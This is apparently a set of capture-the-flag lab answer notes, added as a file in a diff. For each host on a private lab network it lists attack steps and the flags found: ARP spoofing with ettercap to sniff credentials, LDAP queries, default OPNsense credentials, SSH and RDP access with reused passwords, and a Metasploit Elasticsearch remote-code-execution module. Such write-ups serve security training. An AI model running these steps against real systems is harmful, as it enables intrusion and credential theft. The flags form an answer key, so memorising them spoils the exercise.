@@ -1,0 +1,76 @@
+6
+Question 1
+1. sudo ettercap -T -i tap0 -M arp /10.11.12.6/10.11.12.48/ -w file.pcap
+2. tcpdump -r file.pcap -A > file.txt 
+3. cat file.txt | grep FLAG
+FLAG-6986
+Question 2
+1. sudo ettercap -T -i tap0 -M arp /10.11.12.48/10.11.12.48/ -w x.pcap
+2. Open file in wireshark
+3. filter ldap
+4. find user ed@vault.viniyl and password FLAG-6986.
+5. ldapsearch -H ldap://10.11.12.6 -x -b "DC=vault,DC=vinyl" -D "ed@vault.vinyl" -W | grep FLAG
+6. Insert password.
+user flag@vault.vinyl
+phyiscallDeliverOfficeName: FLAG-6659
+
+.13
+Question 1
+Go to 10.11.12.13 in firefox
+Login as default credential
+User: root, Password: opnsense
+Scroll down and find the image with the flag
+FLAG-1578
+Question 2
+Inside the opnsense go to System > Settings > Administration
+Observe and if necessary activate the ssh
+ssh -p 5569 root@10.11.12.13 --> use same password opnsense
+use 8 to open shell
+cat FLAG.txt
+FLAG-1807
+
+.28
+Question 1
+1.  sudo nmap 10.11.12.28 -sV -sC -oN 10.11.12.28.txt
+2. Observe there it is a rdp (Remote Desktop Protocol)
+3. use the ed user with the credentials already found
+4. xfreerdp /u:ed /p:FLAG-6986 /v:10.11.12.28
+5. Enter file system and open the flag.txt
+FLAG-2638
+
+38
+Question 1
+1. reverse shell
+2. sudo cat /var/lib/postgresql/.psql_history
+3. FLAG-3407
+
+.53
+Question 6
+ps aux | grep nginx
+cd /var/www/html/flag
+cat index.html
+FLAG-5466
+Question 5
+cd /var/anonymous
+cat flag.txt
+FLAG-5405
+Question 3
+Go to robots.txt
+FLAG-5794
+Question 7
+1. sudo ettercap -T -i tap0 -M arp /10.11.12.6/10.11.12.48/ -w file.pcap
+2. tcpdump -r file.pcap -A > file.txt 
+3. cat file.txt | grep FLAG
+FLAG-5953
+
+
+.75
+Question 3
+msfconsole
+search elasticsearch
+use multi/elasticsearch/script_mvel_rce
+options
+rhosts --> 10.11.12.75
+lhost --> tap0
+run
+cat flag.txt
